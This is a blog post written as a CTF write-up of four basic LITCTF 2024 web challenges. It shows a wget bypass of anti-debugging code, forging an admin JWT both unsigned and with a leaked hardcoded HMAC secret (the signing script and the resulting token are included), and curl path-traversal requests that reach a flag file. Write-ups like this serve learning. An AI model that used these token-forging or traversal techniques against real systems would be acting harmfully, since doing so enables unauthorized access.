@@ -1,0 +1,259 @@
+---
+pubDatetime: 2024-08-14T00:00:00.000Z
+title: "LITCTF 2024 Writeup: Web (1/5)"
+postSlug: litctf24-web
+featured: false
+draft: false
+tags:
+  - ctf
+  - litctf
+  - litctf24
+  - web
+description: Writeup of 4 web challenges from LITCTF24
+---
+
+This year's Lexington Informatics Tournament CTF competition ([ctftime](https://ctftime.org/event/2444)) took place from August 10th to August 12th. Our [team of 2](https://lit.lhsmathcs.org/team/gaslighting) ([ctftime](https://ctftime.org/team/299906)) solved 23/32 challenges, with a total score of 2938 points. We ranked 37th/830 overall and 8th/124 secondary school teams.
+
+<details>
+<summary>Score screenshots</summary>
+
+[<img src="https://i.sportshead.dev/3lpq75g.png" alt="team profile" style="max-height: 80vh" />](https://lit.lhsmathcs.org/team/gaslighting)
+
+<img src="https://i.sportshead.dev/9owzdeeg.png" alt="categories solved" style="max-height: 30vh" />
+<img src="https://i.sportshead.dev/bh3fswo.png" alt="leaderboard for secondary teams" style="max-height: 40vh" />
+</details>
+
+This post is part 1 of 5 for [LITCTF24](/tags/litctf24).
+
+1. _4 basic web challenges_
+2. [3 basic crypto (+1 misc) challenges](/2024/08/14/litctf24-crypto)
+3. [3 basic rev challenges](/2024/08/14/litctf24-rev)
+4. [web/kirbytime, web/scrainbow, rev/revsite1](/2024/08/14/litctf24-harder-web)
+5. [4 fun pwn challenges](/2024/08/14/litctf24-pwn)
+
+## Table of contents
+
+## web/anti-inspect
+
+_582 solves / 109 points_
+
+> can you find the answer? **WARNING: do not open the link your computer will not enjoy it much.** URL: http://litctf.org:31779/ Hint: If your flag does not work, think about how to style the output of console.log
+
+Seems like there is some kind of anti-debugging code on this website. We can use `wget` to avoid opening the site:
+
+```html
+$ wget http://litctf.org:31779/
+--2024-08-10 23:06:32--  http://litctf.org:31779/
+Resolving litctf.org (litctf.org)... 34.41.224.2
+Connecting to litctf.org (litctf.org)|34.41.224.2|:31779... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 482 [text/html]
+Saving to: ‘index.html’
+
+index.html                                          100%[===================================================================================================================>]     482  --.-KB/s    in 0s
+
+2024-08-10 23:06:33 (35.4 MB/s) - ‘index.html’ saved [482/482]
+$ bat index.html -p
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <script>
+      const flag = "LITCTF{your_%cfOund_teh_fI@g_94932}";
+      while (true)
+        console.log(
+          flag,
+          "background-color: darkblue; color: white; font-style: italic; border: 5px solid hotpink; font-size: 2em;"
+        );
+    </script>
+  </body>
+</html>
+```
+
+The flag is `LITCTF{your_fOund_teh_fI@g_94932}` after removing the format string param.
+
+## web/jwt-1
+
+_488 solves / 111 points_
+
+> I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/.
+
+The challenge website is pretty simple:
+![challenge site, login link and get flag button](https://i.sportshead.dev/uoa96fcg.png)
+
+Signing up gives us a JWT token:
+![jwt token](https://i.sportshead.dev/288fos1i.png)
+
+Let's try to change `admin` to `true`:
+![new jwt token](https://i.sportshead.dev/aakkl27.png)
+
+Changing the `token` cookie to our new JWT gets us the flag:
+![/flag page showing flag](https://i.sportshead.dev/is82xko.png)
+
+Flag: `LITCTF{o0ps_forg0r_To_v3rify_1re4DV9}`
+
+## web/jwt-2
+
+_326 solves / 117 points_
+
+> its like jwt-1 but this one is harder URL: http://litctf.org:31777/
+
+This time we get an `index.ts`:
+
+```ts=
+import express from "express";
+import cookieParser from "cookie-parser";
+import path from "path";
+import fs from "fs";
+import crypto from "crypto";
+
+const accounts: [string, string][] = [];
+
+const jwtSecret = "xook";
+const jwtHeader = Buffer.from(
+  JSON.stringify({ alg: "HS256", typ: "JWT" }),
+  "utf-8"
+)
+  .toString("base64")
+  .replace(/=/g, "");
+
+const sign = (payload: object) => {
+  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
+    .toString("base64")
+    .replace(/=/g, "");
+    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');
+  return jwtHeader + "." + jwtPayload + "." + signature;
+
+}
+
+// ...
+
+app.get("/flag", (req, res) => {
+  if (!req.cookies.token) {
+    console.log('no auth')
+    return res.status(403).send("Unauthorized");
+  }
+
+  try {
+    const token = req.cookies.token;
+    // split up token
+    const [header, payload, signature] = token.split(".");
+    if (!header || !payload || !signature) {
+      return res.status(403).send("Unauthorized");
+    }
+    Buffer.from(header, "base64").toString();
+    // decode payload
+    const decodedPayload = Buffer.from(payload, "base64").toString();
+    // parse payload
+    const parsedPayload = JSON.parse(decodedPayload);
+		// verify signature
+		const expectedSignature = crypto.createHmac('sha256', jwtSecret).update(header + '.' + payload).digest('base64').replace(/=/g, '');
+		if (signature !== expectedSignature) {
+			return res.status(403).send('Unauthorized ;)');
+		}
+    // check if user is admin
+    if (parsedPayload.admin || !("name" in parsedPayload)) {
+      return res.send(
+        fs.readFileSync(path.join(__dirname, "flag.txt"), "utf-8")
+      );
+    } else {
+      return res.status(403).send("Unauthorized");
+    }
+  } catch {
+    return res.status(403).send("Unauthorized");
+  }
+});
+```
+
+Looks like the JWT signature is checked this time. Checking the token we get, it seems like the token is signed with the hardcoded secret:
+![cyberchef JWT verify with secret "xook"](https://i.sportshead.dev/9smo7g9.png)
+
+We can modify the script we get to sign our own flag:
+
+```ts=
+import crypto from "crypto";
+
+const jwtSecret = "xook";
+const jwtHeader = Buffer.from(
+    JSON.stringify({ alg: "HS256", typ: "JWT" }),
+    "utf-8",
+)
+    .toString("base64")
+    .replace(/=/g, "");
+
+const sign = (payload: object) => {
+    const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
+        .toString("base64")
+        .replace(/=/g, "");
+    const signature = crypto
+        .createHmac("sha256", jwtSecret)
+        .update(jwtHeader + "." + jwtPayload)
+        .digest("base64")
+        .replace(/=/g, "");
+    return jwtHeader + "." + jwtPayload + "." + signature;
+};
+
+console.log(sign({ name: "admin", admin: true }));
+```
+
+```shellsession
+$ bun run pwn.ts
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.MTnIgTB1oTbZ2pNsqQreiHQo9309/IoytyoVE4DshM8
+```
+
+![challenge page showing flag](https://i.sportshead.dev/gwfldvd.png)
+Flag: `LITCTF{v3rifyed_thI3_Tlme_1re4DV9}`
+
+Turns out this was actually a mistake by the admins:
+![discord screenshot, @halp: "just fyi, the source for jwt-2 was not meant to have the secret visible, but it accidentally made it in anyways."](https://i.sportshead.dev/9nmkdl7.png)
+
+## web/traversed
+
+_240 solves / 123 points_
+
+> I made this website! you can't see anything else though... right?? URL: http://litctf.org:31778/
+
+The challenge page isn't much help:
+
+```html
+$ curl "http://litctf.org:31778/"
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    Welcome! The flag is hidden somewhere... Try seeing what you can do in the url bar.
+    There isn't much on this page...
+  </body>
+</html>
+```
+
+Let's try to do a simple path traversal:
+
+```shellsession
+$ curl "http://litctf.org:31778/a/%2E%2E/index.html"
+<!DOCTYPE html>
+...
+```
+
+And with a quick guess:
+
+```shellsession
+$ curl "http://litctf.org:31778/a/%2E%2E/%2E%2E/flag.txt"
+LITCTF{backtr@ked_230fim0}
+```
+
+Not a very interesting challenge, but it seems the guesswork has put off a lot of people from solving what is quite a simple challenge.
+
+## Conclusion
+
+These web challenges were pretty basic, involving some fundamental web CTF skills. There were however two more interesting web challenges, `web/kirbytime` and `web/scrainbow`, which I cover in [part 4](/2024/08/14/litctf24-harder-web).
+
+[Part 2](/2024/08/14/litctf24-crypto) covers 3 crypto challenges and 1 misc challenge.
